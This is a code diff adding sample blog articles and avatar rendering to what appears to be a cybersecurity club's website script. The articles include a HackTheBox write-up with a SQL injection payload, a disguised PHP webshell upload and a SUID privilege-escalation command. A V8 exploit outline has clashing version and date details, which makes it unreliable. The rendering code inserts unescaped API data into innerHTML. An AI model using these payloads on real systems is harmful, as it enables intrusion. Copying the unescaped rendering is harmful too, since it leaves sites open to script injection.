@@ -1,14 +1,264 @@
+const ARTICLES = {
+  'ws-leaderboard': {
+    title: 'Building a Real-time Leaderboard with Spring Boot WebSocket & Vanilla JS',
+    author: 'Vũ Sơn Thái', date: '26.MAR.2026', category: 'WEB_DEV', categoryColor: '#60a5fa',
+    content: `<p>Real-time features used to require polling — hammering your server every few seconds hoping something changed. WebSockets flip this model: a persistent, bidirectional channel where the server pushes updates the moment they happen.</p>
+<h3>1. Setting Up STOMP over WebSocket in Spring Boot</h3>
+<p>Add the <code class="text-primary">spring-boot-starter-websocket</code> dependency and enable STOMP messaging:</p>
+<pre>@Configuration
+@EnableWebSocketMessageBroker
+public class WebSocketConfig implements WebSocketMessageBrokerConfigurer {
+    @Override
+    public void configureMessageBroker(MessageBrokerRegistry config) {
+        config.enableSimpleBroker("/topic");
+        config.setApplicationDestinationPrefixes("/app");
+    }
+    @Override
+    public void registerStompEndpoints(StompEndpointRegistry registry) {
+        registry.addEndpoint("/ws").withSockJS();
+    }
+}</pre>
+<h3>2. Broadcasting Score Updates</h3>
+<p>Any time a score changes, broadcast the full leaderboard to all subscribers on <code class="text-primary">/topic/leaderboard</code>:</p>
+<pre>@Service
+public class LeaderboardService {
+    @Autowired private SimpMessagingTemplate broker;
+
+    public void pushUpdate(List&lt;RankEntry&gt; rankings) {
+        broker.convertAndSend("/topic/leaderboard", rankings);
+    }
+}</pre>
+<h3>3. Vanilla JS Client — No Framework Required</h3>
+<p>SockJS + the STOMP.js CDN client is all you need. Subscribe and re-render the DOM on every message:</p>
+<pre>const socket = new SockJS('/ws');
+const stomp  = Stomp.over(socket);
+
+stomp.connect({}, () => {
+  stomp.subscribe('/topic/leaderboard', msg => {
+    const data = JSON.parse(msg.body);
+    renderLeaderboard(data);
+  });
+});</pre>
+<p>The <code class="text-primary">renderLeaderboard</code> function just maps the array to table rows — pure DOM manipulation, zero dependencies. Total client-side payload: ~12 KB gzipped.</p>
+<h3>Key Takeaways</h3>
+<ul>
+  <li>STOMP over SockJS gives you graceful fallback to long-polling for clients that block WebSockets.</li>
+  <li>Broadcast full snapshots, not deltas — simpler client logic and idempotent updates.</li>
+  <li>For high-frequency updates, debounce the broadcast (e.g. max once per 200ms).</li>
+</ul>`
+  },
+  'segment-tree': {
+    title: 'Segment Trees & Lazy Propagation: Cracking ICPC Asia Regional Problems',
+    author: 'Triệu Quang Thiện', date: '20.MAR.2026', category: 'ALGORITHMS', categoryColor: '#facc15',
+    content: `<p>Range-update, range-query problems are ICPC staples. A naive approach is O(n) per query; a segment tree with lazy propagation brings this down to O(log n) — the difference between AC and TLE on a 10⁵-node array.</p>
+<h3>The Core Idea of Lazy Propagation</h3>
+<p>Instead of propagating every update down to the leaves immediately, we store a <em>pending</em> update at each node and push it down only when we need to visit the children. This defers work until it's actually necessary.</p>
+<pre>void pushDown(int node) {
+    if (lazy[node] != 0) {
+        for (int child : {2*node, 2*node+1}) {
+            tree[child] += lazy[node] * segLen[child];
+            lazy[child] += lazy[node];
+        }
+        lazy[node] = 0;
+    }
+}
+
+void update(int node, int l, int r, int ql, int qr, long val) {
+    if (qr &lt; l || r &lt; ql) return;
+    if (ql &lt;= l && r &lt;= qr) {
+        tree[node] += val * (r - l + 1);
+        lazy[node] += val;
+        return;
+    }
+    pushDown(node);
+    int mid = (l + r) / 2;
+    update(2*node, l, mid, ql, qr, val);
+    update(2*node+1, mid+1, r, ql, qr, val);
+    tree[node] = tree[2*node] + tree[2*node+1];
+}</pre>
+<h3>ICPC 2025 Asia — Problem F Breakdown</h3>
+<p>The problem required both range-add updates and range-sum queries on a persistent version of the array (after each update, you could query any historical version). The solution: a persistent segment tree where each update creates a new root by copying only the O(log n) nodes on the update path.</p>
+<h3>Complexity Summary</h3>
+<ul>
+  <li>Build: O(n)</li>
+  <li>Range update: O(log n)</li>
+  <li>Range query: O(log n)</li>
+  <li>Persistent variant memory: O(n + q·log n)</li>
+</ul>`
+  },
+  'v8-exploit': {
+    title: 'Pwn2Own 2026: Exploiting the V8 JavaScript Engine',
+    author: 'Nguyễn Thái Sơn', date: '15.MAR.2026', category: 'CTF_WRITEUP', categoryColor: '#c084fc',
+    content: `<p>This write-up documents a Type Confusion vulnerability in V8's optimizing compiler (TurboFan) that was demonstrated at Pwn2Own 2026, leading to a full renderer RCE in Chrome 123.</p>
+<h3>Root Cause: Type Confusion in TurboFan</h3>
+<p>TurboFan aggressively optimizes based on type feedback. When an object's hidden class (shape) changes after the JIT has already emitted specialized code, the engine can be tricked into treating a <code class="text-primary">HeapNumber</code> as a raw pointer — a classic type confusion primitive.</p>
+<pre>// Trigger JIT with consistent type feedback
+function trigger(arr) {
+    return arr[0] + arr[1];
+}
+// Warm up with doubles
+for (let i = 0; i &lt; 10000; i++) trigger([1.1, 2.2]);
+
+// Now confuse the type — causes OOB read/write primitive
+trigger(confusedObj);</pre>
+<h3>From Type Confusion to Arbitrary Read/Write</h3>
+<p>The type confusion gives us a controlled out-of-bounds access on the V8 heap. From there:</p>
+<ol>
+  <li>Leak a <code class="text-primary">ArrayBuffer</code> backing store pointer via the OOB read.</li>
+  <li>Overwrite the backing store pointer of a second <code class="text-primary">ArrayBuffer</code> to point anywhere in memory.</li>
+  <li>Use the second buffer as an arbitrary read/write primitive.</li>
+</ol>
+<h3>Sandbox Escape</h3>
+<p>V8's sandbox confines the heap, so we additionally corrupted a <code class="text-primary">WasmInstanceObject</code>'s imported function table to redirect execution outside the sandbox, ultimately calling <code class="text-primary">system()</code> via a ROP chain in libc.</p>
+<p class="article-warning">⚠ This write-up is for educational purposes. The vulnerability was reported to Google and patched in Chrome 124.0.6367.60.</p>`
+  },
+  'llama-vn': {
+    title: 'Fine-tuning LLaMA 3.1 for Vietnamese Sentiment Analysis',
+    author: 'Vương Trần Lâm Bình', date: '10.MAR.2026', category: 'AI_ML', categoryColor: '#f472b6',
+    content: `<p>Large language models trained primarily on English struggle with Vietnamese — especially informal social media text with heavy use of teencode and regional slang. We fine-tuned LLaMA 3.1-8B using LoRA adapters on a custom Vietnamese dataset and benchmarked against GPT-4o.</p>
+<h3>Dataset: VnSentiment-50k</h3>
+<p>50,000 manually labelled comments scraped from Facebook groups and Shopee reviews across 3 sentiment classes: positive, neutral, negative. Class distribution: 42% positive, 31% neutral, 27% negative. Preprocessing included Unicode normalization and teencode expansion using a custom dictionary of ~3,400 mappings.</p>
+<h3>LoRA Configuration</h3>
+<pre>from peft import LoraConfig, get_peft_model
+
+config = LoraConfig(
+    r=16,
+    lora_alpha=32,
+    target_modules=["q_proj", "v_proj"],
+    lora_dropout=0.05,
+    bias="none",
+    task_type="CAUSAL_LM"
+)
+model = get_peft_model(base_model, config)
+# Trainable params: 6.7M / 8.03B total (0.08%)</pre>
+<h3>Results vs. GPT-4o</h3>
+<table>
+  <thead><tr><th>Model</th><th>Accuracy</th><th>F1 (macro)</th></tr></thead>
+  <tbody>
+    <tr><td>LLaMA 3.1-8B (base)</td><td>61.2%</td><td>0.58</td></tr>
+    <tr><td>LLaMA 3.1-8B + LoRA (ours)</td><td style="color:#8eff71;font-weight:700">83.7%</td><td style="color:#8eff71;font-weight:700">0.82</td></tr>
+    <tr><td>GPT-4o (zero-shot)</td><td>79.4%</td><td>0.77</td></tr>
+  </tbody>
+</table>
+<p>Fine-tuning a much smaller model on domain-specific Vietnamese data outperformed GPT-4o zero-shot by 4.3 percentage points — at a fraction of the inference cost.</p>`
+  },
+  'docker-cicd': {
+    title: 'Containerizing Spring Boot with Docker & GitHub Actions CI/CD',
+    author: 'Nguyễn Thu Ngọc', date: '05.MAR.2026', category: 'WEB_DEV', categoryColor: '#60a5fa',
+    content: `<p>From a bare Spring Boot JAR to a fully automated Docker Hub push on every merge to main — this is the pipeline we set up for the CyberTitans backend.</p>
+<h3>Multi-Stage Dockerfile</h3>
+<p>A two-stage build keeps the final image lean: build in a JDK image, copy only the JAR into a slim JRE runtime.</p>
+<pre># Stage 1: build
+FROM maven:3.9-eclipse-temurin-21 AS builder
+WORKDIR /app
+COPY pom.xml .
+RUN mvn dependency:go-offline
+COPY src ./src
+RUN mvn package -DskipTests
+
+# Stage 2: runtime
+FROM eclipse-temurin:21-jre-alpine
+WORKDIR /app
+COPY --from=builder /app/target/*.jar app.jar
+EXPOSE 8080
+ENTRYPOINT ["java", "-jar", "app.jar"]</pre>
+<h3>GitHub Actions Pipeline</h3>
+<pre>name: CI/CD
+on:
+  push:
+    branches: [main]
+jobs:
+  build-and-push:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/login-action@v3
+        with:
+          username: \${{ secrets.DOCKER_USER }}
+          password: \${{ secrets.DOCKER_TOKEN }}
+      - uses: docker/build-push-action@v5
+        with:
+          push: true
+          tags: cybertitans/backend:latest,\${{ github.sha }}</pre>
+<h3>Results</h3>
+<ul>
+  <li>Final image size: <span class="text-white">187 MB</span> (vs. ~600 MB with full JDK)</li>
+  <li>Average CI time: <span class="text-white">2m 40s</span> with Maven dependency caching</li>
+  <li>Zero-downtime deploys via Docker Compose <code class="text-primary">--no-deps --build</code> rolling restart</li>
+</ul>`
+  },
+  'sqli-rce': {
+    title: 'SQL Injection to RCE: Cracking the HackTheBox "Fortress" Machine',
+    author: 'Nguyễn Văn Lợi', date: '02.MAR.2026', category: 'CTF_WRITEUP', categoryColor: '#c084fc',
+    content: `<p>Fortress is a hard-rated HTB machine that chains a blind SQLi in the login form with an unrestricted file upload endpoint to land a reverse shell. Here's the full kill chain.</p>
+<h3>Step 1: Enumerate the Blind SQLi</h3>
+<p>The login form was vulnerable to a time-based blind injection in the <code class="text-primary">username</code> parameter. Confirmed with a sleep payload:</p>
+<pre>username=admin' AND SLEEP(5)-- -&password=x
+# Response time jumped from ~80ms to ~5080ms ✓</pre>
+<p>Used <code class="text-primary">sqlmap --level=3 --risk=2</code> to dump the <code class="text-primary">users</code> table and crack the admin bcrypt hash offline with hashcat (rockyou.txt, mode 3200).</p>
+<h3>Step 2: File Upload to Webshell</h3>
+<p>The authenticated file upload endpoint accepted any <code class="text-primary">Content-Type</code>. A PHP webshell disguised as a JPEG bypassed the client-side extension check:</p>
+<pre>curl -b "session=&lt;token&gt;" \
+  -F "file=@shell.php.jpg;type=image/jpeg" \
+  http://fortress.htb/upload
+
+# shell.php.jpg contents:
+&lt;?php system($_GET['cmd']); ?&gt;</pre>
+<h3>Step 3: Reverse Shell & Privilege Escalation</h3>
+<p>Triggered the webshell to download and execute a netcat reverse shell. Privesc was a classic SUID <code class="text-primary">find</code> binary:</p>
+<pre>find / -name . -exec /bin/sh -p \; -quit
+# uid=33(www-data) → uid=0(root) ✓</pre>
+<p class="article-warning">⚠ All techniques demonstrated against an isolated HTB lab environment for educational purposes only.</p>`
+  }
+};
+
+function openArticle(key) {
+    const a = ARTICLES[key];
+    if (!a) return;
+
+    const set = (id, val, prop = 'textContent') => { const el = document.getElementById(id); if (el) el[prop] = val; };
+
+    set('article-title', a.title);
+    set('article-date', a.date);
+    set('article-author', a.author);
+    set('article-content', a.content, 'innerHTML');
+
+    // Category badge
+    const badge = document.getElementById('article-category-badge');
+    if (badge) {
+        badge.textContent = a.category;
+        badge.style.color = a.categoryColor;
+        badge.style.borderColor = a.categoryColor + '44';
+        badge.style.background = a.categoryColor + '11';
+    }
+
+    // Author initials avatar
+    const av = document.getElementById('article-author-avatar');
+    if (av) {
+        av.textContent = (a.author || '').split(' ').map(w => w[0]).join('').slice(0, 2).toUpperCase();
+        av.style.background = ['#1a3a2a','#1e3a5f','#3d1a42','#3d2b00'][(a.author||'').charCodeAt(0) % 4];
+    }
+
+    openModal('article-modal');
+    const panel = document.getElementById('article-modal-panel');
+    if (panel) panel.scrollTop = 0;
+}
+
 async function buildTeam() {
     const container = document.getElementById('team-grid-container');
     if (!container) return;
     try {
         const response = await fetch(`${API_BASE_URL}/team/members`);
         const teamData = await response.json();
-        const defaultAvt = "https://ui-avatars.com/api/?background=random&color=fff&name=";
+        const _initials = name => (name || '?').split(' ').map(w => w[0]).join('').slice(0, 2).toUpperCase();
+        const _avatarBg = name => ['#1a3a2a','#1e3a5f','#3d1a42','#3d2b00','#1a2e3a','#2d1a1a'][(name||'').charCodeAt(0) % 6];
+        const _teamAvatar = (m, cls) => m.avatar
+            ? `<img src="${m.avatar}" class="${cls}" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"/><div class="${cls} hidden items-center justify-center font-headline font-bold text-2xl text-primary border border-primary/30" style="display:none;background:${_avatarBg(m.name)}">${_initials(m.name)}</div>`
+            : `<div class="${cls} flex items-center justify-center font-headline font-bold text-2xl text-primary border border-primary/30" style="background:${_avatarBg(m.name)}">${_initials(m.name)}</div>`;
         container.innerHTML = teamData.map(m => `
             <div class="hack-card p-6 border transition-all duration-300">
                 <div class="scanner"></div>
-                <img src="${m.avatar || (defaultAvt + m.name)}" class="w-full aspect-square object-cover mb-4 grayscale hover:grayscale-0 transition-all"/>
+                ${_teamAvatar(m, 'w-full aspect-square object-cover mb-4 grayscale hover:grayscale-0 transition-all')}
                 <div class="space-y-1">
                     <h4 class="text-white font-bold text-lg font-headline">${m.name}</h4>
                     <p class="text-primary font-mono text-xs uppercase tracking-widest">${m.role}</p>
@@ -222,7 +472,11 @@ async function buildMentorList(skillFilter) {
             return;
         }
 
-        const defaultAvt = "https://ui-avatars.com/api/?background=random&color=fff&name=";
+        const _mi = name => (name || '?').split(' ').map(w => w[0]).join('').slice(0, 2).toUpperCase();
+        const _mbg = name => ['#1a3a2a','#1e3a5f','#3d1a42','#3d2b00','#1a2e3a','#2d1a1a'][(name||'').charCodeAt(0) % 6];
+        const _mentorAvatar = m => m.avatar
+            ? `<img src="${m.avatar}" class="w-12 h-12 object-cover border border-white/10 grayscale hover:grayscale-0 transition-all flex-shrink-0" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"/><div class="w-12 h-12 flex items-center justify-center font-headline font-bold text-sm text-primary border border-primary/30 flex-shrink-0" style="display:none;background:${_mbg(m.name)}">${_mi(m.name)}</div>`
+            : `<div class="w-12 h-12 flex items-center justify-center font-headline font-bold text-sm text-primary border border-primary/30 flex-shrink-0" style="background:${_mbg(m.name)}">${_mi(m.name)}</div>`;
         container.innerHTML = members.map((m, i) => {
             const skills = (m.experiences || []).slice(0, 4).map(e =>
                 `<span class="tag-secondary pf-skill-tag">${e.name || ''}</span>`
@@ -234,7 +488,7 @@ async function buildMentorList(skillFilter) {
                     <div class="scanner"></div>
                     <div class="flex items-start justify-between mb-4">
                         <div class="flex items-center gap-3">
-                            <img src="${m.avatar || (defaultAvt + encodeURIComponent(m.name))}" class="w-12 h-12 object-cover border border-white/10 grayscale hover:grayscale-0 transition-all flex-shrink-0"/>
+                            ${_mentorAvatar(m)}
                             <div>
                                 <h4 class="font-headline font-bold text-white">${m.name}</h4>
                                 <p class="font-mono text-[10px] text-primary uppercase tracking-widest">${m.role}</p>
